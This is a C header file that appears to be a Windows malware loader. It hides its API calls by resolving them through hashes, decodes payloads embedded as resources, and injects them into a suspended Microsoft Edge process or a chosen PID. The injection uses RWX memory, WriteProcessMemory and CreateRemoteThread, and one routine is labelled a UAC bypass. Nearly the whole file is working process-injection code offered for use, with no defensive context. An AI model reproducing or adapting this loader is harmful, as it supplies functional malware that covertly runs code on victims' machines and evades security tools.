#pragma once
#include <windows.h>
#include "resource.h"
#include "crypto.h"
#include "api_helper.h"

char buffer[40960];
DWORD size;
APIs api;
BOOL debug = FALSE;

void _init_api() {
    printf("[*] Resolving APIs for payload...\n"); fflush(stdout);
    InitAPIs(&api,debug);
}
void rcPayload() {

    printf("[*] Resolving APIs for payload...\n"); fflush(stdout);
    InitAPIs(&api,debug);
   
    if (!api.pGetProcAddress || !api.pGetModuleHandleA || !api.pCreateProcess || !api.pGetModuleHandleEx || !api.pFindResource || !api.pLoadResource ||
        !api.pLockResource || !api.pSizeofResource || !api.pVirtualAlloc || !api.pVirtualAllocEx ||
        !api.pWriteProcessMemory || !api.pCreateRemoteThread || !api.pCloseHandle) {
        printf("[-] Failed to resolve required APIs\n"); fflush(stdout);
        return;
    }
    printf("[+] All APIs resolved successfully\n"); fflush(stdout);

    // Create suspended process
    /*STARTUPINFO si = { sizeof(si) };*/
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    printf("[*] Creating suspended process...\n"); fflush(stdout);
    if (!api.pCreateProcess(
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Suspended process created: PID=%lu\n", pi.dwProcessId); fflush(stdout);

    // Get module handle of current executable
    HMODULE mod = NULL;
    if (!api.pGetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCSTR)rcPayload, &mod)) {
        printf("[-] Failed to get module handle, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Current module handle: %p\n", mod); fflush(stdout);

    // Load payload from resources
    HRSRC res = api.pFindResource(mod, MAKEINTRESOURCE(IDR_COFFE1), "COFFE");
    if (!res) {
        printf("[-] Failed to find resource, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }

    size = api.pSizeofResource(mod, res);
    HGLOBAL hResData = api.pLoadResource(mod, res);
    LPVOID ptr = api.pLockResource(hResData);
    if (!ptr || size == 0) {
        printf("[-] Failed to load or lock resource\n"); fflush(stdout);
        return;
    }
    printf("[+] Resource loaded: size=%lu bytes\n", size); fflush(stdout);

    // Allocate memory locally and decode payload
    printf("[*] Allocating local memory for payload...\n"); fflush(stdout);
    printf("[*] pVirtualAlloc address: %p\n", api.pVirtualAlloc);
    printf("[*] Payload size: %lu\n", size);
    BYTE* mem = (BYTE*)api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] Failed to allocate local memory, error: %lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Local memory allocated: %p\n", mem); fflush(stdout);

    CopyMemory(mem, ptr, size);
    decode(mem, size);
    printf("[+] Payload decoded in local memory\n"); fflush(stdout);

    // Allocate memory in remote process
    LPVOID remoteMem = api.pVirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] Failed to allocate memory in remote process, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Remote memory allocated: %p\n", remoteMem); fflush(stdout);

    // Write payload to remote process
    printf("[*] pi.hProcess: %p, remoteMem: %p, mem: %p, size: %lu\n", pi.hProcess, remoteMem, mem, size);

    SIZE_T written = 0;
    BOOL wpmResult = api.pWriteProcessMemory(pi.hProcess, remoteMem, mem, size, &written);
    printf("[*] WriteProcessMemory result: %d, bytes written: %llu\n", wpmResult, written);
    if (!wpmResult) {
        printf("[-] Failed to write payload to remote process, error: %lu\n", api.pGetLastError());
        for (int i = 0; i < 8 && i < size; i++) printf("%02X ", ((BYTE*)mem)[i]);
        printf("\n");
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Written %llu bytes to remote process\n", written); fflush(stdout);

    // Execute payload in remote process
    printf("[*] Creating remote thread...\n"); fflush(stdout);
    HANDLE thread = api.pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!thread) {
        printf("[-] Failed to create remote thread, error: %lu\n", api.pGetLastError()); fflush(stdout);
    }
    else {
        printf("[+] Remote thread created successfully\n"); fflush(stdout);
        api.pCloseHandle(thread);
    }

    // Cleanup
    api.pCloseHandle(pi.hThread);
    api.pCloseHandle(pi.hProcess);
    api.pVirtualFree(mem, 0, MEM_RELEASE);
    api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

void runPayload() {

    /*printf("[*] Resolving APIs for payload...\n"); fflush(stdout);
    InitAPIs(&api,debug);*/
    // Resolve all APIs we need by hash
    if (!api.pGetProcAddress || !api.pGetModuleHandleA || !api.pCreateProcess || !api.pGetModuleHandleEx || !api.pFindResource || !api.pLoadResource ||
        !api.pLockResource || !api.pSizeofResource || !api.pVirtualAlloc || !api.pVirtualAllocEx ||
        !api.pWriteProcessMemory || !api.pCreateRemoteThread || !api.pCloseHandle) {
        printf("[-] Failed to resolve required APIs\n"); fflush(stdout);
        return;
    }
    printf("[+] All APIs resolved successfully\n"); fflush(stdout);

    // Create suspended process
    /*STARTUPINFO si = { sizeof(si) };*/
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    printf("[*] Creating suspended process...\n"); fflush(stdout);
    if (!api.pCreateProcess(
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process, error=%lu\n", GetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Suspended process created: PID=%lu\n", pi.dwProcessId); fflush(stdout);

    BYTE* mem = (BYTE*)api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] Failed to allocate local memory, error: %lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    CopyMemory(mem, buffer, size);
    decode(mem, size);
    printf("[+] Payload decoded in local memory\n");
    // Allocate memory in remote process
    LPVOID remoteMem = api.pVirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] Failed to allocate memory in remote process, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Remote memory allocated: %p\n", remoteMem); fflush(stdout);

    // Write payload to remote process
    printf("[*] pi.hProcess: %p, remoteMem: %p, mem: %p, size: %lu\n", pi.hProcess, remoteMem, mem, size);

    SIZE_T written = 0;
    BOOL wpmResult = api.pWriteProcessMemory(pi.hProcess, remoteMem, mem, size, &written);
    printf("[*] WriteProcessMemory result: %d, bytes written: %llu\n", wpmResult, written);
    if (!wpmResult) {
        printf("[-] Failed to write payload to remote process, error: %lu\n", api.pGetLastError());
        for (int i = 0; i < 8 && i < size; i++) printf("%02X ", ((BYTE*)mem)[i]);
        printf("\n");
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Written %llu bytes to remote process\n", written); fflush(stdout);

    // Execute payload in remote process
    printf("[*] Creating remote thread...\n"); fflush(stdout);
    HANDLE thread = api.pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!thread) {
        printf("[-] Failed to create remote thread, error: %lu\n", GetLastError()); fflush(stdout);
    }
    else {
        printf("[+] Remote thread created successfully\n"); fflush(stdout);
        api.pCloseHandle(thread);
    }

    // Cleanup
    api.pCloseHandle(pi.hThread);
    api.pCloseHandle(pi.hProcess);
    api.pVirtualFree(mem, 0, MEM_RELEASE);
    api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

void pidResourcePayload(DWORD pid) {

    printf("[*] Resolving APIs for payload...\n"); fflush(stdout);
    InitAPIs(&api,debug);

    if (!api.pGetProcAddress || !api.pOpenProcess || !api.pGetModuleHandleA || !api.pGetModuleHandleEx ||
        !api.pFindResource || !api.pLoadResource || !api.pLockResource || !api.pSizeofResource ||
        !api.pVirtualAlloc || !api.pVirtualAllocEx || !api.pWriteProcessMemory ||
        !api.pCreateRemoteThread || !api.pCloseHandle) {
        printf("[-] Failed to resolve required APIs\n"); fflush(stdout);
        return;
    }
    printf("[+] All APIs resolved successfully\n"); fflush(stdout);

    // Open the target process
    HANDLE hProcess = api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %lu. Error: %lu\n", pid, api.pGetLastError());
        return;
    }
    printf("[+] Successfully opened target process %lu\n", pid); fflush(stdout);

    // Get module handle of current executable
    HMODULE mod = NULL;
    if (!api.pGetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)rcPayload, &mod)) {
        printf("[-] Failed to get module handle, error=%lu\n", api.pGetLastError()); fflush(stdout);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Current module handle: %p\n", mod); fflush(stdout);

    // Load payload from resources
    HRSRC res = api.pFindResource(mod, MAKEINTRESOURCE(IDR_COFFE1), "COFFE");
    if (!res) {
        printf("[-] Failed to find resource, error=%lu\n", api.pGetLastError()); fflush(stdout);
        api.pCloseHandle(hProcess);
        return;
    }

    size = api.pSizeofResource(mod, res);
    HGLOBAL hResData = api.pLoadResource(mod, res);
    LPVOID ptr = api.pLockResource(hResData);
    if (!ptr || size == 0) {
        printf("[-] Failed to load or lock resource\n"); fflush(stdout);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Resource loaded: size=%lu bytes\n", size); fflush(stdout);

    // Allocate memory locally and decode payload
    BYTE* mem = (BYTE*)api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] Failed to allocate local memory, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pCloseHandle(hProcess);
        return;
    }
    CopyMemory(mem, ptr, size);
    decode(mem, size);
    printf("[+] Payload decoded in local memory\n"); fflush(stdout);

    // Allocate memory in remote process
    LPVOID remoteMem = api.pVirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] Failed to allocate memory in remote process, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Remote memory allocated: %p\n", remoteMem); fflush(stdout);

    // Write payload to remote process
    SIZE_T written = 0;
    BOOL wpmResult = api.pWriteProcessMemory(hProcess, remoteMem, mem, size, &written);
    if (!wpmResult) {
        printf("[-] Failed to write payload, error: %lu\n", api.pGetLastError());
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Written %llu bytes to remote process\n", written); fflush(stdout);

    // Execute payload in remote process
    HANDLE hThread = api.pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread, error: %lu\n", api.pGetLastError()); fflush(stdout);
    }
    else {
        printf("[+] Remote thread created successfully\n"); fflush(stdout);
        api.pCloseHandle(hThread);
    }

    // Cleanup
    api.pVirtualFree(mem, 0, MEM_RELEASE);
    api.pVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    api.pCloseHandle(hProcess);
    printf("[+] Cleanup complete\n"); fflush(stdout);
}


void pidPayload(DWORD pid) {

    if (!api.pGetProcAddress || !api.pOpenProcess || !api.pGetModuleHandleA || !api.pCreateProcess || !api.pGetModuleHandleEx || !api.pFindResource || !api.pLoadResource ||
        !api.pLockResource || !api.pSizeofResource || !api.pVirtualAlloc || !api.pVirtualAllocEx ||
        !api.pWriteProcessMemory || !api.pCreateRemoteThread || !api.pCloseHandle) {
        printf("[-] Failed to resolve required APIs\n"); fflush(stdout);
        return;
    }
    printf("[+] All APIs resolved successfully\n"); fflush(stdout);

    // Get a Handle to a running Process
    HANDLE hProcess = api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process %lu. Error: %lu\n", pid, api.pGetLastError());
        return;
    }

    printf("[+] Successfully opened process %lu!\n", pid);

    // Allocate local memory
    BYTE* mem = (BYTE*)api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] Failed to allocate local memory, error: %lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }

    CopyMemory(mem, buffer, size);
    decode(mem, size);
    printf("[+] Payload decoded in local memory\n");

    // Allocate memory in remote process
    LPVOID remoteMem = api.pVirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] Failed to allocate memory in remote process, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Remote memory allocated: %p\n", remoteMem); fflush(stdout);

    // Write payload to remote process
    SIZE_T written = 0;
    BOOL wpmResult = api.pWriteProcessMemory(hProcess, remoteMem, mem, size, &written);
    printf("[*] WriteProcessMemory result: %d, bytes written: %llu\n", wpmResult, written);
    if (!wpmResult) {
        printf("[-] Failed to write payload to remote process, error: %lu\n", api.pGetLastError());
        for (int i = 0; i < 8 && i < size; i++) printf("%02X ", mem[i]);
        printf("\n");
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        api.pCloseHandle(hProcess);
        return;
    }
    printf("[+] Written %llu bytes to remote process\n", written); fflush(stdout);

    // Execute payload in remote process
    printf("[*] Creating remote thread...\n"); fflush(stdout);
    HANDLE hThread = api.pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread, error: %lu\n", api.pGetLastError()); fflush(stdout);
    }
    else {
        printf("[+] Remote thread created successfully\n"); fflush(stdout);
        api.pCloseHandle(hThread);
    }

    // Cleanup
    api.pVirtualFree(mem, 0, MEM_RELEASE);
    api.pVirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    api.pCloseHandle(hProcess);
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

void RCuacBypass() {
    printf("[*] Resolving APIs for payload...\n"); fflush(stdout);
    InitAPIs(&api, debug);

    if (!api.pGetProcAddress || !api.pGetModuleHandleA || !api.pCreateProcess || !api.pGetModuleHandleEx || !api.pFindResource || !api.pLoadResource ||
        !api.pLockResource || !api.pSizeofResource || !api.pVirtualAlloc || !api.pVirtualAllocEx ||
        !api.pWriteProcessMemory || !api.pCreateRemoteThread || !api.pCloseHandle) {
        printf("[-] Failed to resolve required APIs\n"); fflush(stdout);
        return;
    }
    printf("[+] All APIs resolved successfully\n"); fflush(stdout);

    // Create suspended process
    /*STARTUPINFO si = { sizeof(si) };*/
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    printf("[*] Creating suspended process...\n"); fflush(stdout);
    if (!api.pCreateProcess(
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Suspended process created: PID=%lu\n", pi.dwProcessId); fflush(stdout);

    // Get module handle of current executable
    HMODULE mod = NULL;
    if (!api.pGetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCSTR)rcPayload, &mod)) {
        printf("[-] Failed to get module handle, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Current module handle: %p\n", mod); fflush(stdout);

    // Load payload from resources
    HRSRC res = api.pFindResource(mod, MAKEINTRESOURCE(IDR_SUZUME1), "SUZUME");
    if (!res) {
        printf("[-] Failed to find resource, error=%lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }

    size = api.pSizeofResource(mod, res);
    HGLOBAL hResData = api.pLoadResource(mod, res);
    LPVOID ptr = api.pLockResource(hResData);
    if (!ptr || size == 0) {
        printf("[-] Failed to load or lock resource\n"); fflush(stdout);
        return;
    }
    printf("[+] Resource loaded: size=%lu bytes\n", size); fflush(stdout);

    // Allocate memory locally and decode payload
    printf("[*] Allocating local memory for payload...\n"); fflush(stdout);
    printf("[*] pVirtualAlloc address: %p\n", api.pVirtualAlloc);
    printf("[*] Payload size: %lu\n", size);
    BYTE* mem = (BYTE*)api.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] Failed to allocate local memory, error: %lu\n", api.pGetLastError()); fflush(stdout);
        return;
    }
    printf("[+] Local memory allocated: %p\n", mem); fflush(stdout);

    CopyMemory(mem, ptr, size);
    decode(mem, size);
    printf("[+] Payload decoded in local memory\n"); fflush(stdout);

    // Allocate memory in remote process
    LPVOID remoteMem = api.pVirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] Failed to allocate memory in remote process, error: %lu\n", api.pGetLastError()); fflush(stdout);
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Remote memory allocated: %p\n", remoteMem); fflush(stdout);

    // Write payload to remote process
    printf("[*] pi.hProcess: %p, remoteMem: %p, mem: %p, size: %lu\n", pi.hProcess, remoteMem, mem, size);

    SIZE_T written = 0;
    BOOL wpmResult = api.pWriteProcessMemory(pi.hProcess, remoteMem, mem, size, &written);
    printf("[*] WriteProcessMemory result: %d, bytes written: %llu\n", wpmResult, written);
    if (!wpmResult) {
        printf("[-] Failed to write payload to remote process, error: %lu\n", api.pGetLastError());
        for (int i = 0; i < 8 && i < size; i++) printf("%02X ", ((BYTE*)mem)[i]);
        printf("\n");
        api.pVirtualFree(mem, 0, MEM_RELEASE);
        api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }
    printf("[+] Written %llu bytes to remote process\n", written); fflush(stdout);

    // Execute payload in remote process
    printf("[*] Creating remote thread...\n"); fflush(stdout);
    HANDLE thread = api.pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!thread) {
        printf("[-] Failed to create remote thread, error: %lu\n", api.pGetLastError()); fflush(stdout);
    }
    else {
        printf("[+] Remote thread created successfully\n"); fflush(stdout);
        api.pCloseHandle(thread);
    }

    // Cleanup
    api.pCloseHandle(pi.hThread);
    api.pCloseHandle(pi.hProcess);
    api.pVirtualFree(mem, 0, MEM_RELEASE);
    api.pVirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
    printf("[+] Cleanup complete\n"); fflush(stdout);
}

void Test() {
	InitAPIs(&api,debug);
    /*DWORD_PTR CreateThreadAddr = getFunctionAddressByHash(decryptedName, getHashFromString("CreateThread"));
    DWORD_PTR CreateProcessAddr = getFunctionAddressByHash(decryptedName, getHashFromString("CreateProcessA"));
    DWORD_PTR VirtualAllocExAddr = getFunctionAddressByHash(decryptedName, getHashFromString("VirtualAllocEx"));*/

    if (!api.pCreateThread || !api.pCreateProcess || !api.pVirtualAllocEx)
        return -1;

    // Cast to function pointer
    /*customCreateThread CreateThreadFunc = (customCreateThread)CreateThreadAddr;*/

    DWORD tid = 0;
    HANDLE hThread = api.pCreateThread(NULL, 0, TestThread, NULL, 0, &tid);
    if (hThread) {
        printf("[+] Thread created successfully!\n");
        api.pCloseHandle(hThread);
    }
}

